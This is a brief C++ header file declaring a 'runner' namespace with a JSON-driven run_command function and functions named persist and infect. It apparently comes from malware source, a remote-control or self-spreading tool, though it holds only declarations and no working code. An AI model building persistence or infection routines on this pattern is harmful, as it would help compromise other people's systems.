#pragma once
#include <string>
#include "utils/com.hpp"

#include "modules/fs.hpp"
#include "modules/syscontrol.hpp"

namespace runner {
    std::string run_command(std::string, picojson::object);
    void persist();
    void infect();
}
